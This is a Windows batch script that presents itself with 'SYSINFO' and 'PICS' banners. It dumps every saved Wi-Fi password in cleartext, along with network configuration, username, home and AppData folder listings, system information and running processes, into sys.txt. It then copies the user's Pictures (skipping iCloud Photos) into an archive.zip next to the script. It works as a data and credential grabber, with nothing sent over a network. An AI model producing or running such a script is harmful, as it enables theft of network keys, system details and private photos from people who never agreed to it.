@echo off
setlocal enabledelayedexpansion

:: Variables
set "current_directory=%~dp0"
set "pictures_dir=%HOMEDRIVE%%HOMEPATH%\Pictures"
set "totalSize=0"
set "temp_dir=%temp%\temp_archive"

:: System information
echo  ______     __  __     ______     __     __   __     ______   ______    
echo /\  ___\   /\ \_\ \   /\  ___\   /\ \   /\ "-.\ \   /\  ___\ /\  __ \   
echo \ \___  \  \ \____ \  \ \___  \  \ \ \  \ \ \-.  \  \ \  __\ \ \ \/\ \  
echo  \/\_____\  \/\_____\  \/\_____\  \ \_\  \ \_\\"\_\  \ \_\    \ \_____\ 
echo   \/_____/   \/_____/   \/_____/   \/_/   \/_/ \/_/   \/_/     \/_____/ 

echo:
set /p "=CURRENT PROCESS: wifi" <nul
echo wifi passwords >> sys.txt
echo: >> sys.txt

for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
	set wifi_pwd=
	for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
	set wifi_pwd=%%F
	)
	echo %%a : !wifi_pwd! >> sys.txt
)

echo ...DONE!
echo:
set /p "=CURRENT PROCESS: ipconfig" <nul
echo ------------------------------------------------------------- >> sys.txt
echo ipconfig /all >> sys.txt
ipconfig /all >> sys.txt
echo ...DONE!
echo:
set /p "=CURRENT PROCESS: username" <nul
echo ------------------------------------------------------------- >> sys.txt
echo username >> sys.txt
echo %USERNAME% >> sys.txt
echo ...DONE!
echo:
set /p "=CURRENT PROCESS: home" <nul
echo ------------------------------------------------------------- >> sys.txt
echo home >> sys.txt
dir "%HOMEDRIVE%%HOMEPATH%" >> sys.txt
echo ...DONE!
echo:
set /p "=CURRENT PROCESS: appdata" <nul
echo ------------------------------------------------------------- >> sys.txt
echo appdata >> sys.txt
dir %AppData% >> sys.txt
echo ...DONE!
echo:
echo ------------------------------------------------------------- >> sys.txt
echo systeminfo >> sys.txt
systeminfo >> sys.txt
echo CURRENT PROCESS: systeminfo...DONE!
echo:
set /p "=CURRENT PROCESS: tasklist" <nul
echo ------------------------------------------------------------- >> sys.txt
echo tasklist >> sys.txt
tasklist /v /fi "SESSIONNAME eq Console" >> sys.txt
cls

echo System Information saved^^!
echo:

:: Pictures info
echo  ______   __     ______     ______    
echo /\  == \ /\ \   /\  ___\   /\  ___\   
echo \ \  __/ \ \ \  \ \ \____  \ \___  \  
echo  \ \_\    \ \_\  \ \_____\  \/\_____\ 
echo   \/_/     \/_/   \/_____/   \/_____/ 
                                                                                
echo:
echo %pictures_dir%
echo:
for /d %%a in ("%pictures_dir%\*") do (
    set "folderName=%%~nxa"
    set "folderSize=0"
    for %%b in ("%%a\*") do (
        set /a "folderSize+=%%~zb"
    )
    set /a "folderSizeKB=folderSize/1024"
    set /a "estimatedKB+=folderSizeKB"
    echo [Folder] %%~nxa - Size: !folderSizeKB:~0,-3!,!folderSizeKB:~-3! KB
)

for %%a in ("%pictures_dir%\*") do (
    set "itemName=%%~nxa"
    set /a "itemSizeKB=%%~za/1024"
    set /a "estimatedKB+=itemSizeKB"
    echo [File] %%~nxa - Size: !itemSizeKB:~0,-3!,!itemSizeKB:~-3! KB
)

for /r "%pictures_dir%" %%f in (*) do (
    set /a totalSize+=%%~zf
)

set /a totalSizeMB=totalSize / 1048576

for /f %%a in ('powershell "$size = %totalSizeMB% ; '{0:N0}' -f $size"') do (
    set "formattedSize=%%a"
)

echo:
echo Folder size: %formattedSize% MB
echo:

:: Compressing the pictures
set /p "choice=Do you want to compress the directory (y/n)? "
if /i "!choice!" equ "n" (
	cls
) else (
	echo NEXT: compressing file
	echo:

	for /r "%pictures_dir%" %%F in (*) do (
		set "current_path=%%~F"
		
		echo !current_path! | find /i "iCloud Photos" >nul
		
		if errorlevel 1 (
			mkdir "!temp_dir!" 2>nul
			copy "!current_path!" "!temp_dir!\%%~nxF"
		)
	)

	set "script_dir=%~dp0"
	set "pictures_file_path=%script_dir%\archive.zip"

	powershell -Command "Compress-Archive -Path '!temp_dir!\*' -DestinationPath '!pictures_file_path!'"

	rd /s /q "!temp_dir!"

	echo DONE: compressing file
)

exit /b 0